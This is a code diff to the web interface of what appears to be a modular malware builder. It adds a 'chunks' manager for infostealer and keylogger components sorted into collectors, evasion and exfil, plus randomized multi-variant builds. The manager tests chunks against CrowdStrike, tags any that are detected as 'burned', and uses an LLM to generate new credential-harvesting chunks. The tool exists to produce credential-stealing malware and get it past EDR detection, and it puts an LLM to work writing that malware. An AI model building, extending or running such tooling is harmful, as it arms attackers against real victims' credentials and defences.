@@ -17,6 +17,7 @@
   --yellow: #e3a820;
   --red:    #f04848;
   --purple: #b07dff;
+  --cyan:   #22d3ee;
   --mono: 'JetBrains Mono','Fira Code','Cascadia Code',Consolas,monospace;
   --sans: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
 }
@@ -107,6 +108,14 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
 }
 .mode-btn:hover{color:var(--text);border-color:var(--muted)}
 .mode-btn.sel{color:var(--accent);border-color:var(--accent);background:rgba(56,139,253,.08)}
+
+/* Small buttons */
+.small-btn{
+  padding:4px 10px;font-size:11px;font-weight:600;cursor:pointer;
+  border:1px solid var(--border);border-radius:4px;color:var(--text);
+  background:var(--bg3);transition:all .12s;
+}
+.small-btn:hover{border-color:var(--accent);color:var(--accent)}
 .mode-btn.cloud.sel{color:var(--purple);border-color:var(--purple);background:rgba(188,140,255,.08)}
 
 /* Disabled section */
@@ -496,6 +505,7 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
       <button class="tab" data-cmd="listener">c2</button>
       <button class="tab" data-cmd="verify">verify</button>
       <button class="tab" data-cmd="clean">clean</button>
+      <button class="tab" data-cmd="chunks" style="color:var(--cyan)">chunks</button>
     </div>
     <div class="form-scroll" id="form-area"></div>
     <div class="run-wrap" style="display:flex;gap:6px">
@@ -681,6 +691,10 @@ const CMDS = {
   edr: {
     label: 'edr',
     build: (sec) => { buildEdrForm(sec); }
+  },
+  chunks: {
+    label: 'chunks',
+    build: (sec) => { buildChunksForm(sec); }
   },
 };
 
@@ -1000,6 +1014,10 @@ document.getElementById('tabs').addEventListener('click', ev => {
     setSshView(false);
     btn.style.display = 'none';
     refreshEdrScores();
+  } else if (activeCmd === 'chunks') {
+    setSshView(false);
+    btn.style.display = 'none';
+    refreshChunkRegistry();
   } else {
     setSshView(false);
     if (activeJobId && activeJobCmd === activeCmd) {
@@ -1534,6 +1552,18 @@ function buildChunkForm(area) {
           <option value="max">Max (+ LLM rewrite)</option>
         </select>
       </div>
+      <div style="display:flex;gap:8px;margin-top:6px">
+        <div class="field" style="flex:1">
+          <label for="chunk-variants">Variants</label>
+          <input type="number" id="chunk-variants" value="1" min="1" max="50" style="width:100%;font-family:var(--mono);font-size:11px" onchange="chunkVariantsChange()">
+        </div>
+        <div class="field" style="flex:2;align-self:flex-end">
+          <label class="chk-row" style="margin:0"><input type="checkbox" id="chunk-randomize"> Randomize chunks</label>
+        </div>
+      </div>
+      <p id="chunk-variants-hint" style="display:none;font-size:10px;color:var(--muted);margin-top:2px">
+        Generates multiple unique variants with different chunk selections. Deploy disabled for multi-variant builds.
+      </p>
     </div>
 
     <div class="sec">
@@ -1667,6 +1697,8 @@ const CHUNK_FIELDS = [
   {id:'chunk-use-sim', type:'chk'},
   {id:'chunk-llm-url', type:'val'},
   {id:'chunk-llm-model', type:'val'},
+  {id:'chunk-variants', type:'val'},
+  {id:'chunk-randomize', type:'chk'},
 ];
 
 function saveChunkState() {
@@ -1679,6 +1711,21 @@ function saveChunkState() {
     });
     localStorage.setItem('mgf_state_chunk', JSON.stringify(state));
   } catch(e) {}
+}
+
+function chunkVariantsChange() {
+  const variants = parseInt(document.getElementById('chunk-variants')?.value || '1');
+  const hint = document.getElementById('chunk-variants-hint');
+  const deploy = document.getElementById('chunk-deploy');
+  const randomize = document.getElementById('chunk-randomize');
+  if (variants > 1) {
+    if (hint) hint.style.display = '';
+    if (deploy) deploy.disabled = true;
+    if (randomize) randomize.checked = true;
+  } else {
+    if (hint) hint.style.display = 'none';
+    if (deploy) deploy.disabled = false;
+  }
 }
 
 function restoreChunkState() {
@@ -1886,6 +1933,8 @@ async function chunkBuild() {
   const vm_user = document.getElementById('chunk-vm-user')?.value || 'vmuser';
   const vm_pass = document.getElementById('chunk-vm-pass')?.value || 'vmuser123';
   const c2_port = document.getElementById('chunk-c2-port')?.value || '9001';
+  const variants = parseInt(document.getElementById('chunk-variants')?.value || '1');
+  const randomize = document.getElementById('chunk-randomize')?.checked ?? false;
 
   const recipe = document.getElementById('chunk-recipe')?.value || (malware_type === 'keylogger' ? 'keylogger' : 'infostealer_full');
 
@@ -1918,7 +1967,7 @@ async function chunkBuild() {
     } catch(e) { flashError(`Hybrid loop failed: ${e}`); }
     return;
   } else {
-    body = {mode: 'recipe', recipe, compile, deploy, obfuscation, llm_url, llm_model, vm_port, vm_user, vm_pass, c2_port};
+    body = {mode: 'recipe', recipe, compile, deploy: variants === 1 ? deploy : false, obfuscation, variants, randomize: randomize || variants > 1, llm_url, llm_model, vm_port, vm_user, vm_pass, c2_port};
   }
 
   try {
@@ -2567,13 +2616,6 @@ async function checkSysmonStatus() {
   div.innerHTML = '<span style="color:var(--yellow)">Checking VM...</span>';
   try {
     const r = await fetch('/api/jobs', {method:'GET'});
-    // Use a one-shot job to check sysmon status via SSH
-    const body = {
-      command: 'run',
-      spec: 'spec.yaml',
-      malware_type: 'check',
-    };
-    // Instead of a full job, just show static info
     div.innerHTML = `
       <div style="margin-bottom:4px">
         <span style="color:var(--green)">Sysmon v15.21</span> installed at C:\\Tools\\Sysmon64.exe
@@ -2585,6 +2627,299 @@ async function checkSysmonStatus() {
   } catch(e) {
     div.innerHTML = '<span style="color:var(--red)">Could not check — is the VM running?</span>';
   }
+}
+
+// ── Chunk Manager ─────────────────────────────────────────────────────────────
+let chunksData = null;
+
+function buildChunksForm(area) {
+  area.innerHTML = `
+    <div class="sec">
+      <div class="sec-hdr">CHUNK REGISTRY</div>
+      <div style="margin:8px 0;font-size:11px;color:var(--muted)">
+        Manage chunk status, validate against CrowdStrike, create new chunks.
+      </div>
+      <div style="display:flex;gap:6px;margin-bottom:8px">
+        <button class="small-btn" onclick="refreshChunkRegistry()">&#x21bb; Refresh</button>
+      </div>
+      <div id="chunk-stats" style="font-family:var(--mono);font-size:11px;margin-bottom:10px"></div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr" style="color:var(--yellow)">VALIDATE CHUNKS</div>
+      <div style="font-size:11px;color:var(--muted);margin-bottom:8px">
+        Test chunks against CrowdStrike to identify which trigger detection.
+      </div>
+      <div class="field">
+        <label>Category</label>
+        <select id="validate-category" style="font-size:11px">
+          <option value="">-- Select category --</option>
+          <option value="collectors">collectors</option>
+          <option value="ad_collectors">ad_collectors</option>
+          <option value="evasion">evasion</option>
+          <option value="exfil">exfil</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Or specific chunks (comma-separated)</label>
+        <input type="text" id="validate-chunks" placeholder="collectors/browser_chromium,collectors/screenshot" style="font-size:11px">
+      </div>
+      <div class="field">
+        <label>Base recipe</label>
+        <input type="text" id="validate-recipe" placeholder="infostealer_cs_full_working" value="infostealer_cs_full_working" style="font-size:11px">
+      </div>
+      <div class="field">
+        <label class="chk-row"><input type="checkbox" id="validate-thorough"> Thorough mode (test each individually)</label>
+      </div>
+      <div class="field">
+        <label class="chk-row"><input type="checkbox" id="validate-update-registry" checked> Update registry with results</label>
+      </div>
+      <div style="display:flex;gap:6px;margin-top:8px">
+        <button class="small-btn" onclick="startValidateJob()" style="background:var(--yellow);color:#000">&#9654; Validate</button>
+        <button class="small-btn" onclick="startValidateJob(true)">Dry Run</button>
+      </div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr" style="color:var(--cyan)">EXPAND / CREATE NEW</div>
+      <div style="font-size:11px;color:var(--muted);margin-bottom:8px">
+        Create new chunks with LLM assistance. Uses ChromaDB for reference code.
+      </div>
+      <div class="field">
+        <label>Chunk type</label>
+        <select id="expand-type" style="font-size:11px">
+          <option value="collector">collector</option>
+          <option value="evasion">evasion</option>
+          <option value="exfil">exfil</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Description (what should it do?)</label>
+        <textarea id="expand-description" placeholder="Harvest saved passwords from Firefox profile" style="font-size:11px;height:60px"></textarea>
+      </div>
+      <div class="field">
+        <label>Variants to create</label>
+        <input type="number" id="expand-count" value="1" min="1" max="5" style="font-size:11px;width:60px">
+      </div>
+      <div class="field">
+        <label class="chk-row"><input type="checkbox" id="expand-validate"> Validate against CrowdStrike after creation</label>
+      </div>
+      <div style="display:flex;gap:6px;margin-top:8px">
+        <button class="small-btn" onclick="startExpandJob()" style="background:var(--cyan);color:#000">&#9654; Create Chunk</button>
+      </div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr" style="color:var(--red)">BURNED / DISABLED</div>
+      <div id="chunk-disabled" style="font-size:11px"></div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr" style="color:var(--green)">NEW CHUNKS (last 7 days)</div>
+      <div id="chunk-new" style="font-size:11px"></div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr">ALL CHUNKS</div>
+      <div style="margin-bottom:6px">
+        <select id="chunk-category-filter" onchange="filterChunks()" style="font-size:11px;padding:3px 6px">
+          <option value="all">All Categories</option>
+          <option value="collectors">collectors</option>
+          <option value="ad_collectors">ad_collectors</option>
+          <option value="evasion">evasion</option>
+          <option value="exfil">exfil</option>
+          <option value="core">core</option>
+        </select>
+      </div>
+      <div id="chunk-list" style="font-size:11px;max-height:250px;overflow-y:auto"></div>
+    </div>
+  `;
+  refreshChunkRegistry();
+}
+
+async function refreshChunkRegistry() {
+  try {
+    const r = await fetch('/api/chunk/registry');
+    chunksData = await r.json();
+    renderChunkStats();
+    renderChunkDisabled();
+    renderChunkNew();
+    renderChunkList();
+  } catch(e) {
+    document.getElementById('chunk-stats').innerHTML = '<span style="color:var(--red)">Failed to load registry</span>';
+  }
+}
+
+function renderChunkStats() {
+  const div = document.getElementById('chunk-stats');
+  if (!div || !chunksData) return;
+  const s = chunksData.stats;
+  div.innerHTML = `
+    <span style="color:var(--green)">&#x2713; ${s.enabled} enabled</span> &nbsp;|&nbsp;
+    <span style="color:var(--red)">&#x2717; ${s.disabled} disabled</span> &nbsp;|&nbsp;
+    <span style="color:var(--cyan)">${s.new} new</span> &nbsp;|&nbsp;
+    <span style="color:var(--muted)">${s.total} total</span>
+  `;
+}
+
+function renderChunkDisabled() {
+  const div = document.getElementById('chunk-disabled');
+  if (!div || !chunksData) return;
+  if (!chunksData.disabled.length) {
+    div.innerHTML = '<span style="color:var(--muted)">No disabled chunks</span>';
+    return;
+  }
+  div.innerHTML = chunksData.disabled.map(d => `
+    <div style="padding:4px 0;border-bottom:1px solid var(--border)">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <span style="color:var(--red)">${d.ref}</span>
+        <button class="small-btn" onclick="toggleChunk('${d.ref}', 'enabled')" style="padding:2px 6px;font-size:10px">Enable</button>
+      </div>
+      <div style="color:var(--muted);font-size:10px;margin-top:2px">${d.reason}</div>
+    </div>
+  `).join('');
+}
+
+function renderChunkNew() {
+  const div = document.getElementById('chunk-new');
+  if (!div || !chunksData) return;
+  if (!chunksData.new_chunks.length) {
+    div.innerHTML = '<span style="color:var(--muted)">No new chunks (last 7 days)</span>';
+    return;
+  }
+  div.innerHTML = chunksData.new_chunks.map(c => `
+    <div style="padding:3px 0;border-bottom:1px solid var(--border);display:flex;justify-content:space-between">
+      <span style="color:var(--cyan)">${c}</span>
+      <button class="small-btn" onclick="viewChunkSource('${c}')" style="padding:2px 6px;font-size:10px">View</button>
+    </div>
+  `).join('');
+}
+
+function renderChunkList() {
+  const div = document.getElementById('chunk-list');
+  if (!div || !chunksData) return;
+  const filter = document.getElementById('chunk-category-filter')?.value || 'all';
+  const cats = chunksData.chunks_by_category;
+  let html = '';
+  for (const [cat, chunks] of Object.entries(cats)) {
+    if (filter !== 'all' && cat !== filter) continue;
+    html += `<div style="margin-top:8px;margin-bottom:4px;color:var(--muted);font-size:10px;font-weight:700">${cat.toUpperCase()} (${chunks.length})</div>`;
+    chunks.forEach(c => {
+      const statusColor = c.status === 'enabled' ? 'var(--green)' : 'var(--red)';
+      const statusIcon = c.status === 'enabled' ? '&#x2713;' : '&#x2717;';
+      const newBadge = c.is_new ? '<span style="background:var(--cyan);color:#000;padding:0 4px;border-radius:2px;font-size:9px;margin-left:4px">NEW</span>' : '';
+      const tags = c.tags.filter(t => t !== 'new').map(t => `<span style="background:var(--bg3);padding:0 3px;border-radius:2px;font-size:9px">${t}</span>`).join(' ');
+      html += `<div style="padding:3px 0;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+        <div>
+          <span style="color:${statusColor}">${statusIcon}</span>
+          <span>${c.name}</span>${newBadge} ${tags}
+        </div>
+        <div style="display:flex;gap:4px">
+          <button class="small-btn" onclick="viewChunkSource('${c.ref}')" style="padding:2px 6px;font-size:9px">src</button>
+          <button class="small-btn" onclick="toggleChunk('${c.ref}', '${c.status === 'enabled' ? 'disabled' : 'enabled'}')" style="padding:2px 6px;font-size:9px">${c.status === 'enabled' ? 'dis' : 'en'}</button>
+        </div>
+      </div>`;
+    });
+  }
+  div.innerHTML = html || '<span style="color:var(--muted)">No chunks found</span>';
+}
+
+function filterChunks() {
+  renderChunkList();
+}
+
+async function toggleChunk(ref, newStatus) {
+  const reason = newStatus === 'disabled' ? prompt('Reason for disabling:', '') : null;
+  try {
+    await fetch('/api/chunk/registry/' + encodeURIComponent(ref), {
+      method: 'PUT',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({status: newStatus, reason: reason, tags: newStatus === 'disabled' ? ['burned'] : []})
+    });
+    refreshChunkRegistry();
+  } catch(e) { flashError('Toggle failed: ' + e); }
+}
+
+async function viewChunkSource(ref) {
+  try {
+    const r = await fetch('/api/chunk/source/' + encodeURIComponent(ref));
+    const txt = await r.text();
+    document.getElementById('modal-title').textContent = ref;
+    document.getElementById('modal-body').textContent = txt;
+    document.getElementById('modal-bg').classList.add('open');
+  } catch(e) { flashError('Could not load: ' + e); }
+}
+
+async function startValidateJob(dryRun = false) {
+  const category = document.getElementById('validate-category')?.value || '';
+  const chunks = document.getElementById('validate-chunks')?.value?.trim() || '';
+  const recipe = document.getElementById('validate-recipe')?.value?.trim() || '';
+  const thorough = document.getElementById('validate-thorough')?.checked || false;
+  const updateRegistry = document.getElementById('validate-update-registry')?.checked || false;
+
+  if (!category && !chunks) {
+    flashError('Select a category or enter specific chunks to validate');
+    return;
+  }
+
+  const body = {};
+  if (category) body.category = category;
+  if (chunks) body.chunks = chunks;
+  if (recipe) body.recipe = recipe;
+  if (thorough) body.thorough = true;
+  if (updateRegistry) body.update_registry = true;
+  if (dryRun) body.dry_run = true;
+
+  try {
+    const r = await fetch('/api/chunk/validate', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(body)
+    });
+    const data = await r.json();
+    if (data.error) {
+      flashError('Validate error: ' + data.error);
+      return;
+    }
+    if (data.job_id) {
+      openJob(data.job_id, data.cmd_str, true);
+    }
+  } catch(e) { flashError('Validate failed: ' + e); }
+}
+
+async function startExpandJob() {
+  const type = document.getElementById('expand-type')?.value || 'collector';
+  const desc = document.getElementById('expand-description')?.value?.trim() || '';
+  const count = parseInt(document.getElementById('expand-count')?.value) || 1;
+  const validate = document.getElementById('expand-validate')?.checked || false;
+
+  if (!desc) {
+    flashError('Enter a description for the new chunk');
+    return;
+  }
+
+  const body = {
+    type: type,
+    description: desc,
+    count: count,
+    validate: validate
+  };
+
+  try {
+    const r = await fetch('/api/chunk/expand', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(body)
+    });
+    const data = await r.json();
+    if (data.error) {
+      flashError('Expand error: ' + data.error);
+      return;
+    }
+    if (data.job_id) {
+      openJob(data.job_id, data.cmd_str, true);
+    }
+  } catch(e) { flashError('Expand failed: ' + e); }
 }
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
